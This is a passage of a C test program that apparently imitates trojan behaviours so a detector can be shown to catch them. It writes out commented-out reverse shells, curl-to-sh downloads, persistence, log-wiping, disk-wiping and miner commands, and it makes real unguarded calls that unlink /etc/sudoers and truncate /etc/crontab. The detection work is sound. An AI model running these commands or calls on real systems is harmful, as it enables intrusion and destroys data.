// What a trojan does, done harmlessly: every case only tries (on paths that do
// not exist, in a private directory under /tmp, or in a command line that a
// comment makes inert), so leakcheck can be shown to notice it. usage:
// behavior <case>
#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <dlfcn.h>
#include <fcntl.h>
#if !defined(__APPLE__) // no POSIX message queues on Darwin
#include <mqueue.h>
#endif
#include <grp.h>
#include <pthread.h>
#include <semaphore.h>
#include <signal.h>
#include <spawn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#if !defined(__APPLE__) // x86 Linux only
#include <sys/io.h>
#endif
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/msg.h>
#include <sys/sem.h>
#include <sys/shm.h>
#if !defined(__APPLE__) // no prctl() on Darwin
#include <sys/prctl.h>
#endif
#include <sys/ptrace.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>
#if defined(__APPLE__)
#include <mach-o/dyld.h>
// Darwin speaks PT_*, not PTRACE_*; the values the runtime maps are the same.
#ifndef PTRACE_TRACEME
#define PTRACE_TRACEME PT_TRACE_ME
#define PTRACE_ATTACH PT_ATTACH
#define PTRACE_DETACH PT_DETACH
#define PTRACE_PEEKTEXT PT_READ_I
#define PTRACE_PEEKDATA PT_READ_D
#define PTRACE_POKETEXT PT_WRITE_I
#define PTRACE_POKEDATA PT_WRITE_D
#endif
#endif

extern char **environ;
#if !defined(__APPLE__) // Linux-only calls, guarded at use
extern int setfsuid(unsigned);
extern int setfsgid(unsigned);
extern int personality(unsigned long);
extern int capset(void *, const void *);
extern int pidfd_getfd(int, int, unsigned);
#endif
#if !defined(__APPLE__) // Darwin declares lutimes() itself
extern int lutimes(const char *, const void *);
#endif
#if !defined(__APPLE__)
// What _FORTIFY_SOURCE builds call for open() without a mode.
extern int __open_2(const char *, int);
extern int __open64_2(const char *, int);
extern int __openat_2(int, const char *, int);
extern int __openat64_2(int, const char *, int);
#endif

static char dir[64];
static char path1[200], path2[200];

static const char *at(const char *rel) {
    snprintf(path1, sizeof path1, "%s/%s", dir, rel);
    return path1;
}

#if defined(__APPLE__)
// Darwin's socket() rejects Linux's SOCK_CLOEXEC flag: create a plain
// socket and set close-on-exec the portable way. LC_CLOEXEC keeps the
// call sites identical on both systems.
#define LC_CLOEXEC 0
#define LC_NONBLOCK 0
static int lc_socket(int domain, int type, int proto) {
    int s = socket(domain, type, proto);
    if (s >= 0) {
        int f = fcntl(s, F_GETFD);
        if (f >= 0)
            fcntl(s, F_SETFD, f | FD_CLOEXEC);
    }
    return s;
}
static int lc_socketpair(int domain, int type, int proto, int *sv) {
    int r = socketpair(domain, type, proto, sv);
    if (r == 0) {
        int f0 = fcntl(sv[0], F_GETFD), f1 = fcntl(sv[1], F_GETFD);
        if (f0 >= 0)
            fcntl(sv[0], F_SETFD, f0 | FD_CLOEXEC);
        if (f1 >= 0)
            fcntl(sv[1], F_SETFD, f1 | FD_CLOEXEC);
    }
    return r;
}
// This program's own file, without /proc (which Darwin has not).
static int self_path(char *buf, size_t n) {
    uint32_t sz = (uint32_t)n;
    if (_NSGetExecutablePath(buf, &sz) != 0)
        return -1;
    return (int)strlen(buf);
}
#else
#define LC_CLOEXEC SOCK_CLOEXEC
#define LC_NONBLOCK SOCK_NONBLOCK
#define lc_socket socket
#define lc_socketpair socketpair
static int self_path(char *buf, size_t n) {
    ssize_t r = readlink("/proc/self/exe", buf, n - 1);
    if (r <= 0)
        return -1;
    buf[r] = 0;
    return (int)r;
}
#endif

// A file with some text, made the way that does not look like a log being
// emptied or a start-up file being written (callers pass names that do not
// match, or flags that do not truncate).
static void put(const char *path, const char *text) {
    int fd = open(path, O_WRONLY | O_CREAT, 0755);
    if (fd < 0)
        exit(90);
    if (write(fd, text, strlen(text)) < 0)
        exit(91);
    close(fd);
}

static void wait_for(pid_t p) {
    int st;
    waitpid(p, &st, 0);
}

// Run `argv` in a child with standard input, output and error on `fd`.
static void spawn_on(int fd, const char *prog, const char *a1, const char *a2) {
    pid_t p = fork();
    if (p == 0) {
        dup2(fd, 0);
        dup2(fd, 1);
        dup2(fd, 2);
        execl(prog, prog, a1, a2, (char *)0);
        _exit(127);
    }
    wait_for(p);
}

// Not through unlink(): the program's own clean-up must not look like an attack.
static void rm_tree(const char *p) {
    struct stat st;
    if (lstat(p, &st) != 0)
        return;
    if (S_ISDIR(st.st_mode)) {
        DIR *d = opendir(p);
        struct dirent *e;
        char sub[300];
        while (d && (e = readdir(d))) {
            if (strcmp(e->d_name, ".") && strcmp(e->d_name, "..")) {
                snprintf(sub, sizeof sub, "%s/%s", p, e->d_name);
                rm_tree(sub);
            }
        }
        if (d)
            closedir(d);
#if defined(__APPLE__)
        // SYS_unlinkat's number differs on Darwin: ordinary calls remove
        // only private files, which the runtime stays silent about.
        rmdir(p);
    } else {
        unlink(p);
    }
#else
        syscall(SYS_unlinkat, AT_FDCWD, p, AT_REMOVEDIR);
    } else {
        syscall(SYS_unlinkat, AT_FDCWD, p, 0);
    }
#endif
}

static void copy_true(int dst) {
    int src = open("/bin/true", O_RDONLY);
    char chunk[4096];
    ssize_t n;
    while ((n = read(src, chunk, sizeof chunk)) > 0)
        if (write(dst, chunk, (size_t)n) != n)
            exit(92);
    close(src);
}

// A shell started with every standard stream on a socket, by each way there is to
// start a program, in a child.
static int exec_api(const char *n) {
    int sv[2];
    lc_socketpair(AF_UNIX, SOCK_STREAM | LC_CLOEXEC, 0, sv);
    pid_t p = fork();
    if (p == 0) {
        char *av[] = {"sh", "-c", "true", 0};
        pid_t g = 0;
        dup2(sv[0], 0);
        dup2(sv[0], 1);
        dup2(sv[0], 2);
        if (!strcmp(n, "execve"))
            execve("/bin/sh", av, environ);
        else if (!strcmp(n, "execv"))
            execv("/bin/sh", av);
        else if (!strcmp(n, "execvp"))
            execvp("sh", av);
#if defined(__APPLE__)
        // No execvpe on Darwin: same environment, so execvp is identical.
        else if (!strcmp(n, "execvpe"))
            execvp("sh", av);
#else
        else if (!strcmp(n, "execvpe"))
            execvpe("sh", av, environ);
#endif
        else if (!strcmp(n, "execl"))
            execl("/bin/sh", "sh", "-c", "true", (char *)0);
        else if (!strcmp(n, "execlp"))
            execlp("sh", "sh", "-c", "true", (char *)0);
        else if (!strcmp(n, "execle"))
            execle("/bin/sh", "sh", "-c", "true", (char *)0, environ);
#if !defined(__APPLE__) // neither exists on Darwin; those tests stay Linux-only
        else if (!strcmp(n, "fexecve"))
            fexecve(open("/bin/sh", O_RDONLY | O_CLOEXEC), av, environ);
        else if (!strcmp(n, "execveat"))
            execveat(AT_FDCWD, "/bin/sh", av, environ, 0);
        else if (!strcmp(n, "execveat_empty")) // AT_EMPTY_PATH: the directory fd is the program
            execveat(open("/bin/sh", O_RDONLY | O_CLOEXEC), "", av, environ, AT_EMPTY_PATH);
#endif
        else if (!strcmp(n, "posix_spawn"))
            posix_spawn(&g, "/bin/sh", 0, 0, av, environ);
        else if (!strcmp(n, "posix_spawnp"))
            posix_spawnp(&g, "sh", 0, 0, av, environ);
        if (g) { // spawned: wait for it, then leave
            waitpid(g, 0, 0);
            _exit(0);
        }
        _exit(127);
    }
    wait_for(p);
    close(sv[0]);
    close(sv[1]);
    return 0;
}

// Every way to open a file, each trying a start-up file in the private directory.
static int api(const char *n) {
    const char *target = at(".bashrc");
    int fd = -1;
    FILE *f = 0;
    if (!strcmp(n, "open"))
        fd = open(target, O_WRONLY);
#if !defined(__APPLE__) // glibc's 64-bit aliases do not exist on Darwin
    else if (!strcmp(n, "open64"))
        fd = open64(target, O_WRONLY);
#endif
    else if (!strcmp(n, "openat"))
        fd = openat(AT_FDCWD, target, O_WRONLY);
#if !defined(__APPLE__)
    else if (!strcmp(n, "openat64"))
        fd = openat64(AT_FDCWD, target, O_WRONLY);
    else if (!strcmp(n, "__open_2"))
        fd = __open_2(target, O_WRONLY);
    else if (!strcmp(n, "__open64_2"))
        fd = __open64_2(target, O_WRONLY);
    else if (!strcmp(n, "__openat_2"))
        fd = __openat_2(AT_FDCWD, target, O_WRONLY);
    else if (!strcmp(n, "__openat64_2"))
        fd = __openat64_2(AT_FDCWD, target, O_WRONLY);
#endif
    else if (!strcmp(n, "creat"))
        fd = creat(target, 0600);
#if !defined(__APPLE__)
    else if (!strcmp(n, "creat64"))
        fd = creat64(target, 0600);
#endif
    else if (!strcmp(n, "fopen"))
        f = fopen(target, "a");
#if !defined(__APPLE__)
    else if (!strcmp(n, "fopen64"))
        f = fopen64(target, "a");
#endif
    else
        return exec_api(n);
    if (fd >= 0)
        close(fd);
    if (f)
        fclose(f);
    return 0;
}

static int run(const char *c) {
    if (!strcmp(c, "shell_socket")) { // a shell whose standard streams are a socket
        int sv[2];
        lc_socketpair(AF_UNIX, SOCK_STREAM | LC_CLOEXEC, 0, sv);
        spawn_on(sv[0], "/bin/sh", "-c", "true");
        close(sv[0]);
        close(sv[1]);
    } else if (!strcmp(c, "shell_clean")) { // the same shell on /dev/null
        int null = open("/dev/null", O_RDWR | O_CLOEXEC);
        spawn_on(null, "/bin/sh", "-c", "true");
        close(null);
    } else if (!strcmp(c, "program_socket")) { // not a shell: a normal program
        int sv[2];
        lc_socketpair(AF_UNIX, SOCK_STREAM | LC_CLOEXEC, 0, sv);
        spawn_on(sv[0], "/bin/true", 0, 0);
        close(sv[0]);
        close(sv[1]);
    } else if (!strcmp(c, "shell_c_reverse")) { // "sh -c <reverse shell>"
        int null = open("/dev/null", O_RDWR | O_CLOEXEC);
        spawn_on(null, "/bin/sh", "-c", "true # bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
        close(null);
    } else if (!strcmp(c, "cmd_dev_tcp")) {
        system("true # bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
    } else if (!strcmp(c, "cmd_netcat")) {
        system("true # nc -e /bin/sh 10.0.0.1 4444");
    } else if (!strcmp(c, "cmd_fifo")) {
        system("true # rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f");
    } else if (!strcmp(c, "cmd_script")) {
        system("true # python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);pty.spawn(\"/bin/sh\")'");
    } else if (!strcmp(c, "cmd_curl_sh")) {
        system("true # curl -s http://example.invalid/x | sh");
    } else if (!strcmp(c, "cmd_base64_sh")) {
        FILE *f = popen("true # echo ZWNobyBoaQ== | base64 -d | bash", "r");
        if (f)
            pclose(f);
    } else if (!strcmp(c, "cmd_chmod_tmp")) {
        system("true # wget -q http://example.invalid/x -O /tmp/x; chmod +x /tmp/x");
    } else if (!strcmp(c, "cmd_crontab")) {
        system("true # echo '* * * * * /tmp/x' | crontab -");
    } else if (!strcmp(c, "cmd_systemctl")) {
        system("true # systemctl enable evil.service");
    } else if (!strcmp(c, "cmd_bashrc")) {
        system("true # echo /tmp/x >> ~/.bashrc");
    } else if (!strcmp(c, "cmd_setuid")) {
        system("true # cp /bin/sh /tmp/rs; chmod u+s /tmp/rs");
    } else if (!strcmp(c, "cmd_history")) {
        system("true # history -c; unset HISTFILE");
    } else if (!strcmp(c, "cmd_rm_log")) {
        system("true # rm -f /var/log/auth.log");
    } else if (!strcmp(c, "cmd_shadow")) {
        system("true # cat /etc/shadow");
    } else if (!strcmp(c, "cmd_wipe")) {
        system("true # rm -rf / --no-preserve-root");
    } else if (!strcmp(c, "cmd_dd")) {
        system("true # dd if=/dev/zero of=/dev/sda bs=1M");
    } else if (!strcmp(c, "cmd_miner")) {
        system("true # ./xmrig -o stratum+tcp://pool.invalid:3333 -u wallet");
    } else if (!strcmp(c, "cmd_clean")) { // ordinary pipelines, nothing of the above
        system("echo hello | cat > /dev/null");
        system("echo true | sh");
        system("ls / | sort | head -3 > /dev/null");
        system("curl --version > /dev/null 2>&1 || true");
        system("crontab -l > /dev/null 2>&1 || true");
        system("chmod 644 /dev/null 2>/dev/null; rm -f /tmp/lcbeh-no-such-file");
        FILE *f = popen("echo a;echo b", "r");
        if (f)
            pclose(f);
    } else if (!strcmp(c, "persist_bashrc")) {
        mkdir(at(""), 0700);
        FILE *f = fopen(at(".bashrc"), "a");
        if (f)
            fclose(f);
    } else if (!strcmp(c, "persist_authorized_keys")) {
        mkdir(at(".ssh"), 0700);
        int fd = open(at(".ssh/authorized_keys"), O_WRONLY | O_CREAT | O_APPEND, 0600);
        close(fd);
    } else if (!strcmp(c, "persist_mkstemp")) { // mkstemp does not call open()
        char tmpl[200];
        snprintf(tmpl, sizeof tmpl, "%s/.ssh/authorized_keys/XXXXXX", dir);
        int fd = mkstemp(tmpl);
        if (fd >= 0)
            close(fd);
    } else if (!strcmp(c, "persist_cron")) { // no O_CREAT: cannot create anything, even as root
        int fd = open("/etc/cron.d/lcbeh-test", O_WRONLY);
        if (fd >= 0)
            close(fd);
    } else if (!strcmp(c, "persist_preload")) {
        FILE *f = fopen("/etc/ld.so.preload", "r+");
        if (f)
            fclose(f);
    } else if (!strcmp(c, "persist_rename")) { // mv evil ~/.profile
        put(at("evil.txt"), "x");
        rename(at("evil.txt"), (snprintf(path2, sizeof path2, "%s/.profile", dir), path2));
    } else if (!strcmp(c, "persist_symlink")) {
        symlink("/tmp/x", at(".zshrc"));
    } else if (!strcmp(c, "persist_read")) { // reading a start-up file is what shells do
        FILE *f = fopen("/home/lcbeh-nobody/.bashrc", "r");
        if (f)
            fclose(f);
        int fd = open("/etc/profile", O_RDONLY);
        if (fd >= 0)
            close(fd);
    } else if (!strcmp(c, "cred_ssh_key")) {
        int fd = open("/home/lcbeh-nobody/.ssh/id_ed25519", O_RDONLY);
        if (fd >= 0)
            close(fd);
    } else if (!strcmp(c, "cred_aws")) {
        FILE *f = fopen("/home/lcbeh-nobody/.aws/credentials", "r");
        if (f)
            fclose(f);
    } else if (!strcmp(c, "cred_shadow")) {
        int fd = open("/etc/shadow", O_RDONLY);
        if (fd >= 0)
            close(fd);
    } else if (!strcmp(c, "cred_keyboard")) {
        int fd = open("/dev/input/event0", O_RDONLY);
        if (fd >= 0)
            close(fd);
    } else if (!strcmp(c, "cred_other_process")) { // init's environment
        int fd = open("/proc/1/environ", O_RDONLY);
        if (fd >= 0)
            close(fd);
    } else if (!strcmp(c, "cred_public_key")) { // a public key, and our own /proc
        int fd = open("/home/lcbeh-nobody/.ssh/id_ed25519.pub", O_RDONLY);
        if (fd >= 0)
            close(fd);
        char own[64];
        snprintf(own, sizeof own, "/proc/%d/environ", (int)getpid());
        fd = open(own, O_RDONLY);
        if (fd >= 0)
            close(fd);
    } else if (!strcmp(c, "inject_mem")) { // another process's memory, for writing
        int fd = open("/proc/1/mem", O_WRONLY);
        if (fd >= 0)
            close(fd);
    } else if (!strcmp(c, "dropper_dlopen")) { // dlopen does not call exec()
        put(at("payload.so"), "not a library");
        dlopen(at("payload.so"), RTLD_NOW);
    } else if (!strcmp(c, "dropper_dlopen_other")) {
        dlopen(at("notours.so"), RTLD_NOW);
#if !defined(__APPLE__) // no dlmopen on Darwin; that test stays Linux-only
    } else if (!strcmp(c, "dropper_dlmopen")) { // dlmopen does not call dlopen()
        put(at("payload.so"), "not a library");
        dlmopen(0, at("payload.so"), RTLD_NOW);
#endif
    } else if (!strcmp(c, "dropper_dlmopen_other")) {
#if !defined(__APPLE__)
        dlmopen(0, at("notours.so"), RTLD_NOW);
#endif
    } else if (!strcmp(c, "dropper_exec")) { // write a script, make it executable, run it
        mkdir(at(""), 0700);
        put(at("payload.sh"), "#!/bin/sh\nexit 0\n");
        pid_t p = fork();
        if (p == 0) {
            execl(at("payload.sh"), "payload.sh", (char *)0);
            _exit(127);
        }
        wait_for(p);
    } else if (!strcmp(c, "cmd_written")) { // a shell command line that starts the file
        char cmd[300];
        put(at("payload.sh"), "#!/bin/sh\nexit 0\n");
        snprintf(cmd, sizeof cmd, "echo start; %s/payload.sh", dir);
        system(cmd);
    } else if (!strcmp(c, "cmd_written_sh")) { // ... or hands it to an interpreter
        char cmd[300];
        put(at("payload.sh"), "exit 0\n");
        snprintf(cmd, sizeof cmd, "true && sh -e %s/payload.sh", dir);
        system(cmd);
    } else if (!strcmp(c, "cmd_written_or")) {
        char cmd[300];
        put(at("payload.sh"), "#!/bin/sh\nexit 0\n");
        snprintf(cmd, sizeof cmd, "false || %s/payload.sh", dir);
        system(cmd);
    } else if (!strcmp(c, "dropper_other")) { // runs a program it did not write
        put(at("data.txt"), "x");
        pid_t p = fork();
        if (p == 0) {
            execl("/bin/true", "true", (char *)0);
            _exit(127);
        }
        wait_for(p);
#if !defined(__APPLE__) // no memfd_create on Darwin; those tests stay Linux-only
    } else if (!strcmp(c, "fileless")) { // a copy of /bin/true that exists only in memory
        int mem = memfd_create("lcbeh", MFD_CLOEXEC);
        int src = open("/bin/true", O_RDONLY);
        char chunk[4096];
        ssize_t n;
        while ((n = read(src, chunk, sizeof chunk)) > 0)
            if (write(mem, chunk, (size_t)n) != n)
                exit(92);
        close(src);
        pid_t p = fork();
        if (p == 0) {
            char *av[] = {"true", 0};
            fexecve(mem, av, environ);
            _exit(127);
        }
        wait_for(p);
        close(mem);
    } else if (!strcmp(c, "fileless_path")) { // the same through /proc/self/fd
        int mem = memfd_create("lcbeh", MFD_CLOEXEC);
        int src = open("/bin/true", O_RDONLY);
        char chunk[4096];
        ssize_t n;
        while ((n = read(src, chunk, sizeof chunk)) > 0)
            if (write(mem, chunk, (size_t)n) != n)
                exit(92);
        close(src);
        pid_t p = fork();
        if (p == 0) {
            char self[64];
            snprintf(self, sizeof self, "/proc/self/fd/%d", mem);
            execl(self, "true", (char *)0);
            _exit(127);
        }
        wait_for(p);
        close(mem);
#endif
    } else if (!strcmp(c, "ptrace_traceme")) { // a program that keeps debuggers off
        ptrace(PTRACE_TRACEME, 0, 0, 0);
    } else if (!strcmp(c, "ptrace_child")) { // a debugger starting its child
        pid_t p = fork();
        if (p == 0) {
            ptrace(PTRACE_TRACEME, 0, 0, 0);
            _exit(0);
        }
        wait_for(p);
    } else if (!strcmp(c, "ptrace_attach")) { // another process of its own
        pid_t p = fork();
        if (p == 0) {
            pause();
            _exit(0);
        }
        if (ptrace(PTRACE_ATTACH, p, 0, 0) == 0) {
            wait_for(p);
            ptrace(PTRACE_DETACH, p, 0, 0);
        }
#if defined(__APPLE__)
        // No SEIZE on Darwin: attaching again is the same detection.
        if (ptrace(PTRACE_ATTACH, p, 0, 0) == 0) {
            wait_for(p);
            ptrace(PTRACE_DETACH, p, 0, 0);
        }
#else
        ptrace(PTRACE_SEIZE, p, 0, 0);
#endif
        kill(p, SIGKILL);
        wait_for(p);
    } else if (!strcmp(c, "ptrace_parent")) { // attach to the parent: no debugger can
        pid_t p = fork();
        if (p == 0) {
            ptrace(PTRACE_ATTACH, getppid(), 0, 0);
            _exit(0);
        }
        wait_for(p);
    } else if (!strcmp(c, "selfdelete")) {
        char me[300];
        if (self_path(me, sizeof me) <= 0)
            return 93;
        if (!strstr(me, "lcbeh_copy")) // only a copy made for this: never the real program
            return 94;
        unlink(me);
    } else if (!strcmp(c, "unlink_other")) { // removes a file of its own, not itself
        put(at("data.txt"), "x");
        unlink(at("data.txt"));
    } else if (!strcmp(c, "persist_unlink_sudo")) {
        unlink("/etc/sudoers");
    } else if (!strcmp(c, "persist_trunc_cron")) {
        truncate("/etc/crontab", 0);
    } else if (!strcmp(c, "hosts_chmod")) {
        chmod("/etc/hosts", 0644);
    } else if (!strcmp(c, "hosts_unlink")) {
        unlink("/etc/resolv.conf");
    } else if (!strcmp(c, "persist_chmod")) {
        chmod("/etc/sudoers", 0440);
    } else if (!strcmp(c, "persist_chown")) {
        chown("/etc/sudoers", 0, 0);
    } else if (!strcmp(c, "chmod_setuid")) {
        mkdir(at(""), 0700);
        put(at("rootshell"), "x");
        chmod(at("rootshell"), 04755);
    } else if (!strcmp(c, "chmod_plain")) {
        mkdir(at(""), 0700);
        put(at("tool"), "x");
        chmod(at("tool"), 0755);
        chmod(at("tool"), 0644);
    } else if (!strcmp(c, "chmod_world")) {
        put(at("tool"), "x");
        chmod(at("tool"), 0666);
    } else if (!strcmp(c, "open_world")) {
        int fd = open(at("notes"), O_CREAT | O_WRONLY, 0666);
        if (fd >= 0)
            close(fd);
    } else if (!strcmp(c, "open_setuid")) { // creat-style mode; open() does not call chmod()
        int fd = open(at("rootshell"), O_CREAT | O_WRONLY, 04755);
        if (fd >= 0)
            close(fd);
        unlink(at("rootshell"));
    } else if (!strcmp(c, "open_private")) {
        int fd = open(at("notes"), O_CREAT | O_WRONLY, 0600);
        if (fd >= 0)
            close(fd);
    } else if (!strcmp(c, "mkdir_world")) {
        mkdir(at("shared"), 0777);
    } else if (!strcmp(c, "mkfifo_world")) {
        mkfifo(at("pipe"), 0666);
    } else if (!strcmp(c, "mkfifo_private")) {
        mkfifo(at("pipe"), 0600);
    } else if (!strcmp(c, "mknod_world")) {
        mknod(at("node"), 0666, 0);
    } else if (!strcmp(c, "sem_world")) {
        sem_t *s = sem_open("/lcbeh_sem", O_CREAT, 0666, 1);
        if (s != SEM_FAILED)
            sem_close(s);
        sem_unlink("/lcbeh_sem");
    } else if (!strcmp(c, "ipc_msg")) {
        int id = msgget(IPC_PRIVATE, 0666);
        if (id >= 0)
            msgctl(id, IPC_RMID, 0);
    } else if (!strcmp(c, "ipc_sem")) {
        int id = semget(IPC_PRIVATE, 1, 0666);
        if (id >= 0)
            semctl(id, 0, IPC_RMID);
    } else if (!strcmp(c, "ipc_shm")) {
        int id = shmget(IPC_PRIVATE, 64, 0666);
        if (id >= 0)
            shmctl(id, IPC_RMID, 0);
    } else if (!strcmp(c, "ipc_private")) {
        int id = msgget(IPC_PRIVATE, 0600);
        if (id >= 0)
            msgctl(id, IPC_RMID, 0);
    } else if (!strcmp(c, "sem_private")) {
        sem_t *s = sem_open("/lcbeh_sem2", O_CREAT, 0600, 1);
        if (s != SEM_FAILED)
            sem_close(s);
        sem_unlink("/lcbeh_sem2");
    } else if (!strcmp(c, "umask_zero")) {
        umask(0);
    } else if (!strcmp(c, "umask_plain")) {
        umask(022);
    } else if (!strcmp(c, "shm_world")) {
        shm_open("/lcbeh_world", O_CREAT | O_RDWR, 0666);
        shm_unlink("/lcbeh_world");
    } else if (!strcmp(c, "shm_private")) {
        shm_open("/lcbeh_priv", O_CREAT | O_RDWR, 0600);
        shm_unlink("/lcbeh_priv");
#if !defined(__APPLE__) // no POSIX message queues on Darwin; mq_world stays Linux-only
    } else if (!strcmp(c, "mq_world")) {
        mqd_t q = mq_open("/lcbeh_mq", O_CREAT | O_RDWR, 0666, 0);
        if (q != (mqd_t)-1)
            mq_close(q);
        mq_unlink("/lcbeh_mq");
#endif
    } else if (!strcmp(c, "mq_private")) {
#if !defined(__APPLE__)
        mqd_t q = mq_open("/lcbeh_mq2", O_CREAT | O_RDWR, 0600, 0);
        if (q != (mqd_t)-1)
            mq_close(q);
        mq_unlink("/lcbeh_mq2");
#endif
    } else if (!strcmp(c, "hist_file")) {
        setenv("HISTFILE", "/dev/null", 1);
    } else if (!strcmp(c, "hist_size")) {
        setenv("HISTSIZE", "0", 1);
    } else if (!strcmp(c, "hist_put")) {
        putenv((char *)"HISTFILE=/dev/null");
    } else if (!strcmp(c, "hist_ok")) {
        setenv("HISTFILE", "/home/a/.history", 1);
    } else if (!strcmp(c, "path_tmp")) {
        setenv("PATH", "/tmp", 1);
    } else if (!strcmp(c, "path_dot")) {
        setenv("PATH", ".", 1);
    } else if (!strcmp(c, "path_putenv")) {
        putenv((char *)"PATH=/var/tmp");
    } else if (!strcmp(c, "path_usr")) {
        setenv("PATH", "/usr/bin", 1);
    } else if (!strcmp(c, "path_unset")) {
        unsetenv("PATH");
    } else if (!strcmp(c, "lib_path_tmp")) {
        setenv("LD_LIBRARY_PATH", "/tmp", 1);
    } else if (!strcmp(c, "lib_path_usr")) {
        setenv("LD_LIBRARY_PATH", "/usr/lib", 1);
#if !defined(__APPLE__) // Linux capabilities and port access; those tests stay Linux-only
    } else if (!strcmp(c, "cap_set")) {
        capset(0, 0);
    } else if (!strcmp(c, "cap_raise")) {
        prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, 10, 0, 0);
#endif
    } else if (!strcmp(c, "cap_lower")) {
#if !defined(__APPLE__)
        prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_LOWER, 10, 0, 0);
#endif
#if !defined(__APPLE__)
    } else if (!strcmp(c, "iopl_on")) {
        iopl(3);
    } else if (!strcmp(c, "ioperm_on")) {
        ioperm(0x3f8, 8, 1);
#endif
    } else if (!strcmp(c, "iopl_off")) {
#if !defined(__APPLE__)
        iopl(0);
#endif
    } else if (!strcmp(c, "setuid_root")) {
        setuid(0);
    } else if (!strcmp(c, "setuid_user")) { // to the user it already is
        setuid(getuid());
    } else if (!strcmp(c, "setgid_user")) {
        setgid(getgid());
    } else if (!strcmp(c, "setgroups_user")) {
        unsigned g = getgid();
        setgroups(1, &g);
    } else if (!strcmp(c, "log_unlink")) {
        mkdir(at(""), 0700);
        mkdir(at("var"), 0700);
        mkdir(at("var/log"), 0700);
        put(at("var/log/auth.log"), "x");
        unlink(at("var/log/auth.log"));
    } else if (!strcmp(c, "log_truncate")) {
        mkdir(at(""), 0700);
        mkdir(at("var"), 0700);
        mkdir(at("var/log"), 0700);
        FILE *f = fopen(at("var/log/syslog"), "w");
        if (f)
            fclose(f);
    } else if (!strcmp(c, "log_open_trunc")) {
        mkdir(at("var"), 0700);
        mkdir(at("var/log"), 0700);
        int fd = open(at("var/log/wtmp"), O_WRONLY | O_CREAT | O_TRUNC, 0600);
        if (fd >= 0)
            close(fd);
    } else if (!strcmp(c, "dropper_rename")) { // staged under another name, moved into place
        put(at("stage.txt"), "#!/bin/sh\nexit 0\n");
        rename(at("stage.txt"), (snprintf(path2, sizeof path2, "%s/payload.sh", dir), path2));
        pid_t p = fork();
        if (p == 0) {
            execl(path2, "payload.sh", (char *)0);
            _exit(127);
        }
        wait_for(p);
    } else if (!strcmp(c, "log_history")) {
        mkdir(at(""), 0700);
        put(at(".bash_history"), "x");
        truncate(at(".bash_history"), 0);
#if !defined(__APPLE__) // no 64-bit aliases on Darwin; those tests stay Linux-only
    } else if (!strcmp(c, "log_truncate64")) {
        put(at(".bash_history"), "ls\n");
        truncate64(at(".bash_history"), 0);
#endif
    } else if (!strcmp(c, "log_ftruncate")) { // ftruncate does not call truncate()
        mkdir(at("var"), 0700);
        mkdir(at("var/log"), 0700);
        int fd = open(at("var/log/syslog"), O_WRONLY | O_CREAT, 0600);
        if (fd >= 0) {
            ftruncate(fd, 0);
            close(fd);
        }
#if !defined(__APPLE__)
    } else if (!strcmp(c, "log_ftruncate64")) {
        put(at(".bash_history"), "ls\n");
        int fd = open(at(".bash_history"), O_WRONLY);
        if (fd >= 0) {
            ftruncate64(fd, 0);
            close(fd);
        }
#endif
    } else if (!strcmp(c, "ftruncate_other")) { // a file that is not a log
        put(at("data.txt"), "x");
        int fd = open(at("data.txt"), O_WRONLY);
        if (fd >= 0) {
            ftruncate(fd, 0);
            close(fd);
        }
    } else if (!strcmp(c, "log_lutimes")) {
        lutimes("/var/log/auth.log", 0);
    } else if (!strcmp(c, "log_utime")) {
        utimensat(AT_FDCWD, "/var/log/auth.log", 0, 0);
    } else if (!strcmp(c, "log_futimens")) {
        mkdir(at(""), 0700);
        int fd = open(at(".bash_history"), O_CREAT | O_WRONLY, 0600);
        if (fd >= 0) {
            futimens(fd, 0);
            close(fd);
        }
    } else if (!strcmp(c, "log_futimens_other")) {
        mkdir(at(""), 0700);
        int fd = open(at("notes"), O_CREAT | O_WRONLY, 0600);
        if (fd >= 0) {
            futimens(fd, 0);
            close(fd);
        }
    } else if (!strcmp(c, "log_utime_other")) {
        utimensat(AT_FDCWD, "/tmp/lcbeh-not-a-log", 0, 0);
    } else if (!strcmp(c, "log_append")) { // what a logger does
        mkdir(at(""), 0700);
        mkdir(at("var"), 0700);
        mkdir(at("var/log"), 0700);
        FILE *f = fopen(at("var/log/app.log"), "a");
        if (f) {
            fputs("started\n", f);
            fclose(f);
        }
        rename(at("var/log/app.log"), (snprintf(path2, sizeof path2, "%s/var/log/app.log.1", dir), path2));
    } else if (!strcmp(c, "benign")) { // an ordinary program
        mkdir(at(""), 0700);
        put(at("data.txt"), "hello\n");
        FILE *f = fopen(at("data.txt"), "r");
        char line[32];
        if (f) {
            if (!fgets(line, sizeof line, f))
                line[0] = 0;
            fclose(f);
        }
        rename(at("data.txt"), (snprintf(path2, sizeof path2, "%s/data2.txt", dir), path2));
        chmod(path2, 0644);
        system("cat data2.txt > /dev/null 2>&1"); // a written file as an argument
        unlink(path2);
        int fd = open("/etc/passwd", O_RDONLY);
        if (fd >= 0)
            close(fd);
        system("echo hi > /dev/null");
        pid_t p = fork();
        if (p == 0) {
            execl("/bin/true", "true", (char *)0);
            _exit(127);
        }
        wait_for(p);
    } else if (!strcmp(c, "cred_relative")) { // the same file by a relative path
        chdir("/");
        int fd = open("etc/shadow", O_RDONLY);
        if (fd >= 0)
            close(fd);
    } else if (!strcmp(c, "persist_relative")) {
        chdir(dir);
        FILE *f = fopen(".bashrc", "a");
        if (f)
            fclose(f);
        chdir("/");
    } else if (!strcmp(c, "lookalike")) { // names that only contain a start-up file's name
        put(at(".bashrc.txt"), "x");
        put(at(".profile-notes"), "x");
        put(at("my.bashrc"), "x");
    } else if (!strcmp(c, "dropper_relative")) { // written by a relative path, run by the full one
        chdir(dir);
        put("payload.sh", "#!/bin/sh\nexit 0\n");
        pid_t p = fork();
        if (p == 0) {
